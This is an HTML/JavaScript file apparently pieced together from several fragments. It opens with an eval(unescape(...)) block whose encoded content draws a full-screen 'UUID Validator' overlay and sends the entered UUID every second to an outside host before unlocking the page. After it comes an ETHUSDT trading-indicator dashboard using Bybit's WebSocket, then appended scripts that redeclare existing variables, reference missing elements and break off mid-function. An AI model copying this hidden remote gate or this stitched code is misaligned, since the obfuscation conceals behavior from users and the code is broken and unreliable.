<html>
<head>
</head>
<body>

<script type="text/javascript">
<!-- 
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%21%44%4f%43%54%59%50%45%20%68%74%6d%6c%3e%5c%6e%3c%68%74%6d%6c%20%6c%61%6e%67%3d%22%65%6e%22%3e%5c%6e%3c%68%65%61%64%3e%5c%6e%20%20%3c%6d%65%74%61%20%63%68%61%72%73%65%74%3d%22%55%54%46%2d%38%22%20%2f%3e%5c%6e%20%20%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%76%69%65%77%70%6f%72%74%22%20%63%6f%6e%74%65%6e%74%3d%22%77%69%64%74%68%3d%64%65%76%69%63%65%2d%77%69%64%74%68%2c%20%69%6e%69%74%69%61%6c%2d%73%63%61%6c%65%3d%31%2e%30%22%2f%3e%5c%6e%20%20%3c%74%69%74%6c%65%3e%55%55%49%44%20%56%61%6c%69%64%61%74%6f%72%20%f0%9f%94%90%3c%2f%74%69%74%6c%65%3e%5c%6e%20%20%3c%73%74%79%6c%65%3e%5c%6e%20%20%20%20%62%6f%64%79%20%7b%5c%6e%20%20%20%20%20%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%73%61%6e%73%2d%73%65%72%69%66%3b%5c%6e%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%23%31%31%31%3b%5c%6e%20%20%20%20%20%20%63%6f%6c%6f%72%3a%20%23%66%66%66%3b%5c%6e%20%20%20%20%20%20%6d%61%72%67%69%6e%3a%20%30%3b%5c%6e%20%20%20%20%20%20%70%61%64%64%69%6e%67%3a%20%30%3b%5c%6e%20%20%20%20%20%20%68%65%69%67%68%74%3a%20%31%30%30%76%68%3b%5c%6e%20%20%20%20%20%20%6f%76%65%72%66%6c%6f%77%3a%20%68%69%64%64%65%6e%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%23%6f%76%65%72%6c%61%79%20%7b%5c%6e%20%20%20%20%20%20%70%6f%73%69%74%69%6f%6e%3a%20%66%69%78%65%64%3b%5c%6e%20%20%20%20%20%20%74%6f%70%3a%20%30%3b%20%6c%65%66%74%3a%20%30%3b%5c%6e%20%20%20%20%20%20%77%69%64%74%68%3a%20%31%30%30%76%77%3b%5c%6e%20%20%20%20%20%20%68%65%69%67%68%74%3a%20%31%30%30%76%68%3b%5c%6e%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%72%67%62%61%28%30%2c%20%30%2c%20%30%2c%20%30%2e%39%35%29%3b%5c%6e%20%20%20%20%20%20%64%69%73%70%6c%61%79%3a%20%66%6c%65%78%3b%5c%6e%20%20%20%20%20%20%66%6c%65%78%2d%64%69%72%65%63%74%69%6f%6e%3a%20%63%6f%6c%75%6d%6e%3b%5c%6e%20%20%20%20%20%20%61%6c%69%67%6e%2d%69%74%65%6d%73%3a%20%63%65%6e%74%65%72%3b%5c%6e%20%20%20%20%20%20%6a%75%73%74%69%66%79%2d%63%6f%6e%74%65%6e%74%3a%20%63%65%6e%74%65%72%3b%5c%6e%20%20%20%20%20%20%7a%2d%69%6e%64%65%78%3a%20%39%39%39%39%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%69%6e%70%75%74%2c%20%62%75%74%74%6f%6e%20%7b%5c%6e%20%20%20%20%20%20%77%69%64%74%68%3a%20%39%30%25%3b%5c%6e%20%20%20%20%20%20%6d%61%78%2d%77%69%64%74%68%3a%20%34%30%30%70%78%3b%5c%6e%20%20%20%20%20%20%70%61%64%64%69%6e%67%3a%20%31%72%65%6d%3b%5c%6e%20%20%20%20%20%20%6d%61%72%67%69%6e%3a%20%30%2e%35%72%65%6d%20%30%3b%5c%6e%20%20%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%72%65%6d%3b%5c%6e%20%20%20%20%20%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%38%70%78%3b%5c%6e%20%20%20%20%20%20%62%6f%72%64%65%72%3a%20%6e%6f%6e%65%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%69%6e%70%75%74%20%7b%5c%6e%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%23%32%32%32%3b%5c%6e%20%20%20%20%20%20%63%6f%6c%6f%72%3a%20%23%66%66%66%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%62%75%74%74%6f%6e%20%7b%5c%6e%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%23%30%30%63%63%36%36%3b%5c%6e%20%20%20%20%20%20%63%6f%6c%6f%72%3a%20%77%68%69%74%65%3b%5c%6e%20%20%20%20%20%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%62%6f%6c%64%3b%5c%6e%20%20%20%20%20%20%63%75%72%73%6f%72%3a%20%70%6f%69%6e%74%65%72%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%62%75%74%74%6f%6e%3a%68%6f%76%65%72%20%7b%5c%6e%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%23%30%30%61%61%35%35%3b%5c%6e%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%23%72%65%73%75%6c%74%20%7b%5c%6e%20%20%20%20%20%20%6d%61%72%67%69%6e%2d%74%6f%70%3a%20%31%72%65%6d%3b%5c%6e%20%20%20%20%20%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%72%65%6d%3b%5c%6e%20%20%20%20%20%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%63%65%6e%74%65%72%3b%5c%6e%20%20%20%20%7d%5c%6e%20%20%3c%2f%73%74%79%6c%65%3e%5c%6e%3c%2f%68%65%61%64%3e%5c%6e%3c%62%6f%64%79%3e%5c%6e%5c%6e%3c%64%69%76%20%69%64%3d%22%6f%76%65%72%6c%61%79%22%3e%5c%6e%20%20%3c%68%32%3e%f0%9f%94%90%20%55%55%49%44%20%56%61%6c%69%64%61%74%6f%72%3c%2f%68%32%3e%5c%6e%20%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%74%65%78%74%22%20%69%64%3d%22%75%75%69%64%49%6e%70%75%74%22%20%70%6c%61%63%65%68%6f%6c%64%65%72%3d%22%45%6e%74%65%72%20%79%6f%75%72%20%55%55%49%44%20%68%65%72%65%2e%2e%2e%22%20%2f%3e%5c%6e%20%20%3c%62%75%74%74%6f%6e%20%6f%6e%63%6c%69%63%6b%3d%22%6d%61%6e%75%61%6c%56%61%6c%69%64%61%74%65%28%29%22%3e%56%61%6c%69%64%61%74%65%20%4e%6f%77%3c%2f%62%75%74%74%6f%6e%3e%5c%6e%20%20%3c%64%69%76%20%69%64%3d%22%72%65%73%75%6c%74%22%3e%f0%9f%93%a1%20%57%61%69%74%69%6e%67%20%66%6f%72%20%76%61%6c%69%64%20%55%55%49%44%2e%2e%2e%3c%2f%64%69%76%3e%5c%6e%3c%2f%64%69%76%3e%5c%6e%5c%6e%3c%73%63%72%69%70%74%3e%5c%6e%20%20%63%6f%6e%73%74%20%75%75%69%64%49%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%75%75%69%64%49%6e%70%75%74%22%29%3b%5c%6e%20%20%63%6f%6e%73%74%20%72%65%73%75%6c%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%72%65%73%75%6c%74%22%29%3b%5c%6e%20%20%63%6f%6e%73%74%20%6f%76%65%72%6c%61%79%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6f%76%65%72%6c%61%79%22%29%3b%5c%6e%5c%6e%20%20%61%73%79%6e%63%20%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%55%55%49%44%28%75%75%69%64%29%20%7b%5c%6e%20%20%20%20%74%72%79%20%7b%5c%6e%20%20%20%20%20%20%63%6f%6e%73%74%20%72%65%73%20%3d%20%61%77%61%69%74%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%63%72%6f%61%6b%2d%62%6f%74%2d%70%72%6f%78%79%2e%6f%6e%72%65%6e%64%65%72%2e%63%6f%6d%2f%76%61%6c%69%64%61%74%65%22%2c%20%7b%5c%6e%20%20%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%22%50%4f%53%54%22%2c%5c%6e%20%20%20%20%20%20%20%20%68%65%61%64%65%72%73%3a%20%7b%20%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%3a%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%22%20%7d%2c%5c%6e%20%20%20%20%20%20%20%20%62%6f%64%79%3a%20%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%20%75%75%69%64%20%7d%29%5c%6e%20%20%20%20%20%20%7d%29%3b%5c%6e%5c%6e%20%20%20%20%20%20%63%6f%6e%73%74%20%64%61%74%61%20%3d%20%61%77%61%69%74%20%72%65%73%2e%6a%73%6f%6e%28%29%3b%5c%6e%5c%6e%20%20%20%20%20%20%69%66%20%28%72%65%73%2e%6f%6b%29%20%7b%5c%6e%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%74%65%78%74%43%6f%6e%74%65%6e%74%20%3d%20%22%e2%9c%85%20%22%20%2b%20%64%61%74%61%2e%6d%65%73%73%61%67%65%3b%5c%6e%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%73%74%79%6c%65%2e%63%6f%6c%6f%72%20%3d%20%22%6c%69%6d%65%22%3b%5c%6e%20%20%20%20%20%20%20%20%6f%76%65%72%6c%61%79%2e%73%74%79%6c%65%2e%64%69%73%70%6c%61%79%20%3d%20%22%6e%6f%6e%65%22%3b%20%2f%2f%20%68%69%64%65%20%6f%76%65%72%6c%61%79%5c%6e%20%20%20%20%20%20%20%20%63%6c%65%61%72%49%6e%74%65%72%76%61%6c%28%61%75%74%6f%56%61%6c%69%64%61%74%6f%72%29%3b%5c%6e%20%20%20%20%20%20%7d%20%65%6c%73%65%20%7b%5c%6e%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%74%65%78%74%43%6f%6e%74%65%6e%74%20%3d%20%22%e2%9d%8c%20%22%20%2b%20%64%61%74%61%2e%72%65%61%73%6f%6e%3b%5c%6e%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%73%74%79%6c%65%2e%63%6f%6c%6f%72%20%3d%20%22%72%65%64%22%3b%5c%6e%20%20%20%20%20%20%7d%5c%6e%5c%6e%20%20%20%20%7d%20%63%61%74%63%68%20%28%65%72%72%29%20%7b%5c%6e%20%20%20%20%20%20%72%65%73%75%6c%74%2e%74%65%78%74%43%6f%6e%74%65%6e%74%20%3d%20%22%e2%9d%8c%20%53%65%72%76%65%72%20%75%6e%72%65%61%63%68%61%62%6c%65%2e%22%3b%5c%6e%20%20%20%20%20%20%72%65%73%75%6c%74%2e%73%74%79%6c%65%2e%63%6f%6c%6f%72%20%3d%20%22%63%72%69%6d%73%6f%6e%22%3b%5c%6e%20%20%20%20%7d%5c%6e%20%20%7d%5c%6e%5c%6e%20%20%66%75%6e%63%74%69%6f%6e%20%6d%61%6e%75%61%6c%56%61%6c%69%64%61%74%65%28%29%20%7b%5c%6e%20%20%20%20%63%6f%6e%73%74%20%75%75%69%64%20%3d%20%75%75%69%64%49%6e%70%75%74%2e%76%61%6c%75%65%2e%74%72%69%6d%28%29%3b%5c%6e%20%20%20%20%69%66%20%28%21%75%75%69%64%29%20%7b%5c%6e%20%20%20%20%20%20%72%65%73%75%6c%74%2e%74%65%78%74%43%6f%6e%74%65%6e%74%20%3d%20%22%e2%9a%a0%ef%b8%8f%20%50%6c%65%61%73%65%20%65%6e%74%65%72%20%61%20%55%55%49%44%2e%22%3b%5c%6e%20%20%20%20%20%20%72%65%73%75%6c%74%2e%73%74%79%6c%65%2e%63%6f%6c%6f%72%20%3d%20%22%6f%72%61%6e%67%65%22%3b%5c%6e%20%20%20%20%7d%20%65%6c%73%65%20%7b%5c%6e%20%20%20%20%20%20%63%68%65%63%6b%55%55%49%44%28%75%75%69%64%29%3b%5c%6e%20%20%20%20%7d%5c%6e%20%20%7d%5c%6e%5c%6e%20%20%63%6f%6e%73%74%20%61%75%74%6f%56%61%6c%69%64%61%74%6f%72%20%3d%20%73%65%74%49%6e%74%65%72%76%61%6c%28%28%29%20%3d%3e%20%7b%5c%6e%20%20%20%20%63%6f%6e%73%74%20%75%75%69%64%20%3d%20%75%75%69%64%49%6e%70%75%74%2e%76%61%6c%75%65%2e%74%72%69%6d%28%29%3b%5c%6e%20%20%20%20%69%66%20%28%75%75%69%64%29%20%63%68%65%63%6b%55%55%49%44%28%75%75%69%64%29%3b%5c%6e%20%20%7d%2c%20%31%30%30%30%29%3b%5c%6e%3c%2f%73%63%72%69%70%74%3e%5c%6e%5c%6e%3c%2f%62%6f%64%79%3e%5c%6e%3c%2f%68%74%6d%6c%3e%27%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>

</body>
</html>
<!DOCTYPE html>
<html>
<head>
  <title>📡 ETHUSDT 1m WebSocket + Smart Indicators</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
    }
    h2 { grid-column: span 2; margin-bottom: 10px; }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      max-height: 85vh;
      overflow-y: auto;
      background: #111;
      padding: 15px;
      border: 1px solid #0f0;
      border-radius: 8px;
    }
    .indicators {
      background: #111;
      padding: 15px;
      border: 1px solid #0f0;
      border-radius: 8px;
      line-height: 1.5;
    }
    .indicators h3 {
      color: #00ffff;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>
  <h2>📡 Live ETHUSDT 1m TF WebSocket + Smart Indicator Panel</h2>
  <pre id="output">Connecting...</pre>
  <div class="indicators" id="indicatorPanel">Loading indicators...</div>

  <script>
    const output = document.getElementById("output");
    const panel = document.getElementById("indicatorPanel");
    const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");

    let candles = [];
    let lastCandleStart = null;
    let lastClose = null;
    let candleCount = 0;
    let recentStochK = [];

    function safe(val) {
      return val === null || val === undefined || isNaN(val) ? "⏳" : val;
    }

    function colorize(val, bullish = true) {
      if (val === null || val === "⏳") return `<span style="color:gray">⏳</span>`;
      const num = parseFloat(val);
      if (bullish && num > 0) return `<span style="color:lime">${val}</span>`;
      if (!bullish && num < 0) return `<span style="color:red">${val}</span>`;
      return `<span style="color:yellow">${val}</span>`;
    }

    function SMA(period, data) {
      if (data.length < period) return null;
      const sum = data.slice(-period).reduce((acc, d) => acc + (d.close || d), 0);
      return (sum / period).toFixed(2);
    }

    function EMA(period, data) {
      if (data.length < period) return null;
      const k = 2 / (period + 1);
      let ema = data.slice(0, period).reduce((acc, d) => acc + d.close, 0) / period;
      for (let i = period; i < data.length; i++) {
        ema = data[i].close * k + ema * (1 - k);
      }
      return ema.toFixed(2);
    }

    function EMAArray(period, data) {
      if (data.length < period) return null;
      const k = 2 / (period + 1);
      let result = [];
      let ema = data.slice(0, period).reduce((acc, d) => acc + d.close, 0) / period;
      result.push(ema);
      for (let i = period; i < data.length; i++) {
        ema = data[i].close * k + ema * (1 - k);
        result.push(ema);
      }
      return result;
    }

    function EMAFromArray(period, arr) {
      if (arr.length < period) return [];
      const k = 2 / (period + 1);
      let result = [];
      let ema = arr.slice(0, period).reduce((acc, val) => acc + val, 0) / period;
      result.push(ema);
      for (let i = period; i < arr.length; i++) {
        ema = arr[i] * k + ema * (1 - k);
        result.push(ema);
      }
      return result;
    }

    function MACD(data) {
      const ema12 = EMAArray(12, data);
      const ema26 = EMAArray(26, data);
      if (!ema12 || !ema26 || ema12.length !== ema26.length) return [null, null, null];
      const macdLine = ema12.map((val, i) => val - ema26[i]);
      const signalLine = EMAFromArray(9, macdLine);
      const histogram = macdLine.map((val, i) => val - (signalLine[i] || 0));
      const latest = macdLine.length - 1;
      return [
        macdLine[latest].toFixed(2),
        signalLine[latest].toFixed(2),
        histogram[latest].toFixed(2)
      ];
    }

    function RSI(period, data) {
      if (data.length < period + 1) return null;
      let gains = 0, losses = 0;
      for (let i = data.length - period; i < data.length; i++) {
        const diff = data[i].close - data[i - 1].close;
        if (diff >= 0) gains += diff;
        else losses -= diff;
      }
      const avgGain = gains / period;
      const avgLoss = losses / period;
      if (avgLoss === 0) return 100;
      const rs = avgGain / avgLoss;
      return (100 - 100 / (1 + rs)).toFixed(2);
    }

    function BollingerBands(period, data) {
      if (data.length < period) return [null, null];
      const slice = data.slice(-period);
      const mean = slice.reduce((acc, d) => acc + d.close, 0) / period;
      const variance = slice.reduce((acc, d) => acc + Math.pow(d.close - mean, 2), 0) / period;
      const stdDev = Math.sqrt(variance);
      return [(mean + 2 * stdDev).toFixed(2), (mean - 2 * stdDev).toFixed(2)];
    }

    function ATR(period, data) {
      if (data.length < period + 1) return null;
      let trs = [];
      for (let i = 1; i < data.length; i++) {
        const high = data[i].high;
        const low = data[i].low;
        const prevClose = data[i - 1].close;
        const tr = Math.max(high - low, Math.abs(high - prevClose), Math.abs(low - prevClose));
        trs.push(tr);
      }
      const atr = trs.slice(-period).reduce((a, b) => a + b, 0) / period;
      return atr.toFixed(2);
    }

    function Donchian(period, data) {
      if (data.length < period) return [null, null];
      const slice = data.slice(-period);
      const high = Math.max(...slice.map(c => c.high));
      const low = Math.min(...slice.map(c => c.low));
      return [high.toFixed(2), low.toFixed(2)];
    }

    function VWAP(data) {
      let cumulativeTPV = 0;
      let cumulativeVolume = 0;
      for (const k of data) {
        const tp = (k.high + k.low + k.close) / 3;
        cumulativeTPV += tp * k.volume;
        cumulativeVolume += k.volume;
      }
      return (cumulativeTPV / cumulativeVolume).toFixed(2);
    }

    function OBV(data) {
      if (data.length < 2) return 0;
      let obv = 0;
      for (let i = 1; i < data.length; i++) {
        if (data[i].close > data[i - 1].close) obv += data[i].volume;
        else if (data[i].close < data[i - 1].close) obv -= data[i].volume;
      }
      return obv.toFixed(2);
    }

    function Pivots(c) {
      const pivot = (c.high + c.low + c.close) / 3;
      const s1 = (2 * pivot) - c.high;
      const r1 = (2 * pivot) - c.low;
      return [pivot.toFixed(2), s1.toFixed(2), r1.toFixed(2)];
    }

    function ParabolicSAR(data, step = 0.02, max = 0.2) {
      if (data.length < 2) return null;
      let isUptrend = true;
      let sar = data[data.length - 2].low;
      let ep = data[data.length - 2].high;
      let af = step;
      for (let i = data.length - 2; i < data.length; i++) {
        if (isUptrend) {
          sar += af * (ep - sar);
          if (data[i].low < sar) {
            isUptrend = false;
            sar = ep;
            ep = data[i].low;
            af = step;
          } else if (data[i].high > ep) {
            ep = data[i].high;
            af = Math.min(af + step, max);
          }
        } else {
          sar += af * (ep - sar);
          if (data[i].high > sar) {
            isUptrend = true;
            sar = ep;
            ep = data[i].high;
            af = step;
          } else if (data[i].low < ep) {
            ep = data[i].low;
            af = Math.min(af + step, max);
          }
        }
      }
      return sar.toFixed(2);
    }

    function ADX(period, data) {
      if (data.length < period + 1) return null;
      let plusDMs = [], minusDMs = [], trs = [];
      for (let i = 1; i < data.length; i++) {
        const upMove = data[i].high - data[i - 1].high;
        const downMove = data[i - 1].low - data[i].low;
        plusDMs.push(upMove > downMove && upMove > 0 ? upMove : 0);
        minusDMs.push(downMove > upMove && downMove > 0 ? downMove : 0);
        const tr = Math.max(data[i].high - data[i].low, Math.abs(data[i].high - data[i - 1].close), Math.abs(data[i].low - data[i - 1].close));
        trs.push(tr);
      }
      const avgTR = trs.slice(-period).reduce((a, b) => a + b, 0) / period;
      const avgPlusDM = plusDMs.slice(-period).reduce((a, b) => a + b, 0) / period;
      const avgMinusDM = minusDMs.slice(-period).reduce((a, b) => a + b, 0) / period;
      const plusDI = 100 * (avgPlusDM / avgTR);
      const minusDI = 100 * (avgMinusDM / avgTR);
      const dx = 100 * Math.abs(plusDI - minusDI) / (plusDI + minusDI);
      return dx.toFixed(2);
    }

    function Stochastic(period, data) {
      if (data.length < period) return [null, null];
      const slice = data.slice(-period);
      const high = Math.max(...slice.map(d => d.high));
      const low = Math.min(...slice.map(d => d.low));
      const currentClose = data[data.length - 1].close;
      const k = ((currentClose - low) / (high - low)) * 100;
      recentStochK.push(k);
      if (recentStochK.length > 3) recentStochK.shift();
      const d = recentStochK.length === 3 ? (recentStochK.reduce((a, b) => a + b, 0) / 3).toFixed(2) : null;
      return [k.toFixed(2), d];
    }

    function checkEMACross(short, long) {
      if (short === null || long === null) return "";
      if (+short > +long) return "🟢 Bullish EMA Cross";
      if (+short < +long) return "🔴 Bearish EMA Cross";
      return "";
    }

    function updateIndicators() {
      const sma14 = SMA(14, candles);
      const ema14 = EMA(14, candles);
      const [macd, signal, histo] = MACD(candles);
      const rsi = RSI(14, candles);
      const [bbU, bbL] = BollingerBands(20, candles);
      const atr = ATR(14, candles);
      const [dcH, dcL] = Donchian(20, candles);
      const vwap = VWAP(candles);
      const obv = OBV(candles);
      const [pivot, s1, r1] = Pivots(candles[candles.length - 1]);
      const sar = ParabolicSAR(candles);
      const adx = ADX(14, candles);
      const [stochK, stochD] = Stochastic(14, candles);
      const emaSignal = checkEMACross(ema14, sma14);

      panel.innerHTML = `
        <h3>🔹 Trend Indicators</h3>
        • SMA14: ${safe(sma14)}<br>
        • EMA14: ${safe(ema14)}<br>
        • EMA Signal: ${emaSignal}<br>
        • MACD Line: ${safe(macd)}<br>
        • Signal Line: ${safe(signal)}<br>
        • Histogram: ${colorize(histo, true)}<br>
        • Parabolic SAR: ${safe(sar)}<br>
        • ADX: ${safe(adx)}
        <h3>🔸 Momentum Indicators</h3>
        • RSI14: ${colorize(rsi)}<br>
        • Stoch %K: ${safe(stochK)}<br>
        • Stoch %D: ${safe(stochD)}
        <h3>🌪️ Volatility Indicators</h3>
        • BB Upper: ${safe(bbU)}<br>
        • BB Lower: ${safe(bbL)}<br>
        • ATR: ${safe(atr)}<br>
        • Donchian High: ${safe(dcH)}<br>
        • Donchian Low: ${safe(dcL)}
        <h3>📦 Volume Indicators</h3>
        • VWAP: ${safe(vwap)}<br>
        • OBV: ${safe(obv)}
        <h3>🔍 Price Action Tools</h3>
        • Pivot: ${safe(pivot)}<br>
        • S1: ${safe(s1)}<br>
        • R1: ${safe(r1)}`;

      if (emaSignal) {
        output.textContent = `🔔 ${emaSignal} @ ${candles[candles.length - 1].close}\n` + output.textContent;
      }
    }

    // ⏱️ Refresh indicators every 1 second
    setInterval(updateIndicators, 1000);

    function logLive(k, isNew = false) {
      const ts = new Date(k.start * 1000).toLocaleTimeString();
      const delta = lastClose !== null ? (k.close - lastClose).toFixed(2) : "N/A";

      if (isNew) {
        candleCount++;
        lastClose = k.close;
        candles.push(k);
        if (candles.length > 150) candles.shift();
        updateIndicators();
      }

      const label = isNew ? "🟢 NEW CANDLE" : "⚡ LIVE UPDATE";
      output.textContent = `
${label} [#${candleCount}] 🕒 ${ts}
📈 Open: ${k.open}
📉 Low: ${k.low}
📊 High: ${k.high}
🔚 Close: ${k.close} (∆ ${delta})
📦 Volume: ${k.volume}
\n\n` + output.textContent;
    }

    socket.onopen = () => {
      output.textContent = "✅ Connected to Bybit WebSocket\n\n";
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
        const k = {
          start: Number(raw.start),
          open: Number(raw.open),
          high: Number(raw.high),
          low: Number(raw.low),
          close: Number(raw.close),
          volume: Number(raw.volume)
        };
        const isNew = k.start !== lastCandleStart;
        if (isNew) lastCandleStart = k.start;
        logLive(k, isNew);
      }
    };

    socket.onerror = () => {
      output.textContent = "❌ WebSocket Error\n\n" + output.textContent;
    };

    socket.onclose = () => {
      output.textContent = "⚠️ WebSocket Closed\n\n" + output.textContent;
    };
  </script>
</body>
</html>
<script>
  async function fetch1MillionCandles(symbol = "ETHUSDT", interval = "1", total = 1000000) {
    const BATCH_SIZE = 1000;
    let candlesFetched = 0;
    let allCandles = [];
    let fromTime = Math.floor(Date.now() / 1000) - total * 60; // go back in time

    while (candlesFetched < total) {
      const url = `https://api.bybit.com/v5/market/kline?category=linear&symbol=${symbol}&interval=${interval}&limit=${BATCH_SIZE}&start=${fromTime * 1000}`;
      try {
        const res = await fetch(url);
        const json = await res.json();

        if (json.retCode !== 0 || !json.result?.list || json.result.list.length === 0) break;

        const batch = json.result.list.map(c => ({
          start: Math.floor(c[0] / 1000),
          open: parseFloat(c[1]),
          high: parseFloat(c[2]),
          low: parseFloat(c[3]),
          close: parseFloat(c[4]),
          volume: parseFloat(c[5])
        }));

        allCandles = allCandles.concat(batch);
        candlesFetched += batch.length;
        fromTime = Math.floor(batch[batch.length - 1].start) + 60; // move forward

        output.textContent = `⏳ Fetching... ${candlesFetched}/${total} candles\n` + output.textContent;
        await new Promise(r => setTimeout(r, 300)); // rate-limit safety
      } catch (err) {
        output.textContent = `❌ Error: ${err.message}\n` + output.textContent;
        break;
      }
    }

    output.textContent = `✅ Finished fetching ${allCandles.length} candles.\n` + output.textContent;

    // Add to live candles array for indicators
    candles = allCandles.slice(-150); // keep latest 150 for indicators
    updateIndicators();
  }

  // Run fetch on load
  fetch1MillionCandles();
</script>
<script>
  async function preloadCandles() {
    output.textContent = "⏳ Fetching 150 candles from Bybit...\n";
    try {
      const res = await fetch('https://api.bybit.com/v5/market/kline?category=linear&symbol=ETHUSDT&interval=1&limit=150');
      const json = await res.json();

      if (json.retCode !== 0 || !json.result?.list?.length) {
        output.textContent += `❌ Failed: ${json.retMsg || "Unknown error"}\n`;
        return;
      }

      const data = json.result.list.reverse();
      candles = data.map(c => ({
        start: Number(c[0]) / 1000,
        open: Number(c[1]),
        high: Number(c[2]),
        low: Number(c[3]),
        close: Number(c[4]),
        volume: Number(c[5])
      }));

      candleCount = candles.length;
      lastClose = candles[candles.length - 1].close;
      lastCandleStart = candles[candles.length - 1].start;

      console.log("✅ Candle sample:", candles.slice(-3));

      const [macd, signal, histo] = MACD(candles);
      console.log("📊 MACD Debug:", { macd, signal, histo });

      output.textContent += `✅ Preloaded ${candles.length} candles\n`;
      updateIndicators();
      connectWebSocket();
    } catch (err) {
      output.textContent += `❌ Fetch error: ${err.message}\n`;
    }
  }

  function connectWebSocket() {
    socket.onopen = () => {
      output.textContent += "✅ WebSocket connected\n";
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
        const k = {
          start: Number(raw.start),
          open: Number(raw.open),
          high: Number(raw.high),
          low: Number(raw.low),
          close: Number(raw.close),
          volume: Number(raw.volume)
        };
        const isNew = k.start !== lastCandleStart;
        if (isNew) lastCandleStart = k.start;
        logLive(k, isNew);
      }
    };

    socket.onerror = () => output.textContent += "❌ WebSocket error\n";
    socket.onclose = () => output.textContent += "⚠️ WebSocket closed\n";
  }

  function MACD(data) {
    const ema12 = EMAArray(12, data);
    const ema26 = EMAArray(26, data);

    if (!ema12 || !ema26 || ema12.length < 1 || ema26.length < 1) {
      console.warn("❌ MACD Error: EMA data incomplete", { ema12, ema26 });
      return [null, null, null];
    }

    const minLen = Math.min(ema12.length, ema26.length);
    const macdLine = ema12.slice(-minLen).map((v, i) => v - ema26.slice(-minLen)[i]);
    const signalLine = EMAFromArray(9, macdLine);

    if (!signalLine || signalLine.length < 1) {
      console.warn("❌ MACD Error: Signal line invalid", { signalLine });
      return [null, null, null];
    }

    const histo = macdLine[macdLine.length - 1] - signalLine[signalLine.length - 1];

    return [
      macdLine[macdLine.length - 1].toFixed(4),
      signalLine[signalLine.length - 1].toFixed(4),
      histo.toFixed(4)
    ];
  }

  setInterval(() => {
    if (candles.length >= 35) {
      updateIndicators();
    } else {
      panel.innerHTML = "⏳ Waiting for more candles...";
    }
  }, 1000);

  preloadCandles(); // Start everything
</script>
<script>
  let candles = [];
  let lastClose = 0;
  let lastCandleStart = 0;
  let candleCount = 0;
  const output = document.querySelector("#output");
  const panel = document.querySelector("#panel");

  async function preloadCandles() {
    output.textContent = "⏳ Fetching 1,000,000 candles from Bybit...\n";

    const maxPerRequest = 1000;
    const totalNeeded = 1000000;
    let fetched = 0;
    let cursor = null;

    try {
      while (fetched < totalNeeded) {
        const url = new URL('https://api.bybit.com/v5/market/kline');
        url.searchParams.set("category", "linear");
        url.searchParams.set("symbol", "ETHUSDT");
        url.searchParams.set("interval", "1");
        url.searchParams.set("limit", maxPerRequest);
        if (cursor) url.searchParams.set("end", cursor);

        const res = await fetch(url);
        const json = await res.json();

        if (json.retCode !== 0 || !json.result?.list?.length) {
          output.textContent += `❌ Failed: ${json.retMsg || "Unknown error"}\n`;
          break;
        }

        const data = json.result.list.reverse();
        candles.unshift(...data.map(c => ({
          start: Number(c[0]) / 1000,
          open: Number(c[1]),
          high: Number(c[2]),
          low: Number(c[3]),
          close: Number(c[4]),
          volume: Number(c[5])
        })));

        fetched += data.length;
        cursor = data[0][0]; // get next batch based on oldest timestamp
        output.textContent = `⏳ Loaded: ${fetched} / ${totalNeeded}\n`;

        if (data.length < maxPerRequest) break; // no more data
      }

      candleCount = candles.length;
      lastClose = candles[candles.length - 1].close;
